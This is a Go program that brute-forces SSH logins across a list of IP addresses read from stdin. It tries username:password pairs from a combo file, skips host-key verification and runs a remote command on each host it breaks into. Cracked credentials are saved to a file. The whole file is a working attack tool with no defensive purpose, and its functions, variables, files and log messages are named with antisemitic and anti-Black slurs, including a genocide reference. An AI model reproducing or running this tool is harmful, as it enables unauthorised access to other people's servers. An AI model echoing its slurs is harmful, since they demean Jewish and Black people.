package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

var payload = "uname"

func configureSSHClient(username, password string) *ssh.ClientConfig {
	return &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         10 * time.Second,
	}
}

func gasJew(ip, username, password string) bool {
	config := configureSSHClient(username, password)

	conn, err := ssh.Dial("tcp", ip+":22", config)
	if err != nil {
		return false
	}
	defer conn.Close()

	fmt.Printf("Jew found - %s %s:%s\n", ip, username, password)

	session, err := conn.NewSession()
	if err != nil {
		return false
	}
	defer session.Close()

	if err := session.Run(payload); err != nil {
		return false
	}

	return true
}

func processJew(ip string, niggerFile string, jewFile string, wg *sync.WaitGroup) {
	defer wg.Done()

	file, err := os.Open(niggerFile)
	if err != nil {
		log.Printf("Error opening nigger file: %v\n", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		combi := strings.Split(scanner.Text(), ":")
		if len(combi) != 2 {
			continue
		}

		username, password := combi[0], combi[1]

		if gasJew(ip, username, password) {
			writeToFile(jewFile, fmt.Sprintf("%s:22 %s:%s\n", ip, username, password))
			break
		}
	}

	if err := scanner.Err(); err != nil {
		log.Printf("Error reading the nigger file: %v\n", err)
	}
}

func writeToFile(filename, data string) {
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Error opening jewish file: %v\n", err)
		return
	}
	defer f.Close()

	if _, err := io.WriteString(f, data); err != nil {
		log.Printf("Error writing to jewish file: %v\n", err)
	}
}

func main() {
	var wg sync.WaitGroup
	niggerFileFile := "niggers.txt"
	jewFile := "jews.txt"
	scanner := bufio.NewScanner(os.Stdin)

	for scanner.Scan() {
		ip := strings.TrimSpace(scanner.Text())
		if ip == "" {
			continue
		}

		wg.Add(1)
		go processJew(ip, niggerFileFile, jewFile, &wg)
	}

	if err := scanner.Err(); err != nil {
		log.Printf("Error reading input: %v\n", err)
	}

	wg.Wait()
}
